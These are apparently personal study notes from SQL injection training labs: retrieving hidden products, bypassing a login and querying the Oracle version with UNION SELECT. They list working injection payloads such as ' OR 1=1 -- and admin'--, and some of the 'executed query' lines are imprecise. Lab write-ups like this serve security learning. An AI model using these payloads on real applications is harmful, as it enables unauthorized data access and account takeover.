## Lab: `Retrieving hidden data`, where you can modify a SQL query to return additional results.
- Original Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- Modified: ![image](https://github.com/user-attachments/assets/e4236490-1079-4f23-92c9-a4097f63a50c)
- Query to executed by DB after injections: `SELECT * FROM products;`

### Injections:
- `'OR '1'='1` - This payload appends an OR condition that always evaluates to true.
- `'OR 1=1 --` - This payload appends an OR condition that always evaluates to true, commenting out the remaining portion of the original query.
- `'OR 'x'='x` - This payload compares a string with itself, resulting in a true condition.

## Lab: SQL injection vulnerability allowing `login bypass`
- Original Query: `SELECT firstname FROM users WHERE username='admin' AND password='admin'`
- Modified: `SELECT firstname FROM users WHERE username='admin'--' AND password='admin'`
- Query to executed by DB after injections: `SELECT firstname FROM users;`

### Injections:
- `'admin'--'` - Commenting out the remaining portion of the original query.

## Lab: SQL injection attack, querying the database type and version on Oracle `Union Query`
- On Oracle databases, every SELECT statement must specify a table to select FROM. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
- There is a `built-in table on Oracle called 'dual'` For example: `UNION SELECT 'abc' FROM dual`

- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'abc','def' FROM dual--`
- Query to executed by DB after injections: `SELECT * FROM products WHERE category = 'Gifts'' UNION SELECT 'abc','def' FROM dual--`
- To get the Oracle Version: `SELECT * FROM products WHERE category = 'Gifts'union+SELECT+banner,NULL+FROM+v$version--`

### Injections:
- `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.

## 







